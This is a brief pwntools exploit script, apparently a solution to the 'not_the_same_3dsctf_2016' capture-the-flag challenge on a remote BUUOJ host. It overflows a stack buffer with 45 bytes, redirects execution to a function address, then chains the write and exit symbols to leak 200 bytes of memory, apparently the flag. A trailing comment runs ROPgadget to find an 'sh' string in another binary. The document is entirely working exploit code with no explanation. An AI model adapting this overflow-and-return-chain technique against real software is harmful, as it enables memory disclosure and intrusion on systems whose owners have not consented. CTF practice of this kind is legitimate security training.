from pwn import *
context.log_level="debug"
p = remote('node4.buuoj.cn',25493)
elf=ELF("not_the_same_3dsctf_2016")
payload=45*b'a'+p32(0x080489A0)+p32(elf.symbols['write'])+p32(elf.symbols['exit'])+p32(1)+p32(0x080ECA2D)+p32(200)
p.sendline(payload)
p.interactive()




#ROPgadget --binary ./ciscn_2019_ne_5 --string 'sh'